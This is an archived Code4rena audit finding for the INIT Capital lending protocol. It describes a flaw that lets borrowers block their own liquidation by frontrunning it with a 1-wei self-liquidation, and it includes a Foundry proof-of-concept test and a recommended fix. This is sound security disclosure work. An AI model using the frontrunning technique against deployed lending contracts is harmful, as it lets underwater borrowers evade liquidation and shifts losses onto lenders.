---
tags:
  - lang/solidity
  - sector/lending
  - sector/stable
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/liquidation-logic
  - impact/mev/frontrun
  - novelty/variant
  - misassumption/math-is-safe
  - fix/redesign-logic
protocol: "[[INIT Capital]]"
auditors:
  - "[[0x73696d616f]]"
report: "https://code4rena.com/reports/2023-12-initcapital"
genome:
  - "[[liquidation-logic]]"
  - "[[frontrun]]"
  - "[[variant]]"
  - "[[debt-accrual-update]]"
  - "[[frontrun-exposure]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
---
# [H-01] Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS\_MANAGER

- id: 29589
- impact: HIGH
- protocol: [[INIT Capital]]
- reporter: 0x73696d616f (Code4rena)
- source: https://code4rena.com/reports/2023-12-initcapital

## Summary


This bug report discusses a potential issue in the `POS_MANAGER` contract where users may be able to avoid being liquidated by frontrunning liquidation calls or doing a partial liquidation. The report includes a proof of concept and recommended mitigation steps. The issue is caused by a wrong assumption in the `updatePosDebtShares()` function and can result in calls to this function reverting. The report recommends updating the user's last debt position on `_repay()` as a mitigation. The bug has been confirmed by the INIT team and the judge has suggested a possible solution. 

## Details


Users can avoid being liquidated if they frontrun liquidation calls with a liquidate call with 1 wei. Or, they may do a partial liquidation and avoid being liquidated before the interest reaches the value of the debt pre liquidation. The total interest stored in `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest` would also be wrong.

### Proof of Concept

The `POS_MANAGER` stores the total interest in `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest`. Function `updatePosDebtShares()` [assumes](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L175) that `ILendingPool(_pool).debtShareToAmtCurrent(currDebtShares)` is always increasing, but this is not the case, as a liquidation may happen that reduces the current debt amount. This leads to calls to `updatePosDebtShares()` reverting.

The most relevant is when liquidating, such that users could liquidate themselves for small amounts (1) and prevent liqudiations in the same block. This is because the debt accrual happens over time, so if the block.timestamp is the same, no debt accrual will happen. Thus, if a liquidate call with 1 amount frontruns a liquidate call with any amount, the second call will revert.

A user could still stop liquidations for as long as the accrued interest doesn't reach the last debt value before liquidation, if the user liquidated a bigger part of the debt.

Add the following test to `TestInitCore.sol`:

```solidity
function test_POC_Liquidate_reverts_frontrunning_PosManager_WrongAssumption() public {
    address poolUSDT = address(lendingPools[USDT]);
    address poolWBTC = address(lendingPools[WBTC]);
    _setTargetHealthAfterLiquidation_e18(1, type(uint64).max); // by pass max health after liquidate capped
    _setFixedRateIRM(poolWBTC, 0.1e18); // 10% per sec

    uint collAmt;
    uint borrAmt;

    {
        uint collUSD = 100_000;
        uint borrUSDMax = 80_000;
        collAmt = _priceToTokenAmt(USDT, collUSD);
        borrAmt = _priceToTokenAmt(WBTC, borrUSDMax);
    }

    address liquidator = BOB;
    deal(USDT, ALICE, collAmt);
    deal(WBTC, liquidator, borrAmt * 2);

    // provides liquidity for borrow
    _fundPool(poolWBTC, borrAmt);

    // create position and collateralize
    uint posId = _createPos(ALICE, ALICE, 1);
    _collateralizePosition(ALICE, posId, poolUSDT, collAmt, bytes(''));

    // borrow
    _borrow(ALICE, posId, poolWBTC, borrAmt, bytes(''));

    // fast forward time and accrue interest
    vm.warp(block.timestamp + 1 seconds);
    ILendingPool(poolWBTC).accrueInterest();

    uint debtShares = positionManager.getPosDebtShares(posId, poolWBTC);

    _liquidate(liquidator, posId, 1, poolWBTC, poolUSDT, false, bytes(''));

    // liquidate all debtShares
    _liquidate(liquidator, posId, 1000, poolWBTC, poolUSDT, false, bytes('panic'));
}
```

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Update the user's last debt position `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest` on `_repay()`.

**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872425149)**


**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872433152):**
 > After discussing internally with the sponsor/warden, we've confirmed the issue.
> Here is a part of the discussion:
> 
> > "When it frontruns the liquidation with 1 share, it removes 1 share and 2 debt.<br>
> > When it calculates the amount again in the following liquidation, the shares will be worth 1 less and it reverts."
> 
> As a mitigation, we can update `extraInfo.totalInterest` only when [debtAmtCurrent > extraInfo.lastDebtAmt](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L176).
>
 > ![image](https://github.com/code-423n4/2023-12-initcapital-findings/assets/45533148/c1bd109c-4c8e-4683-b559-055128efb64f)
> 
 > High is appropriate as the main invariant might be broken temporarily while repaying.

***
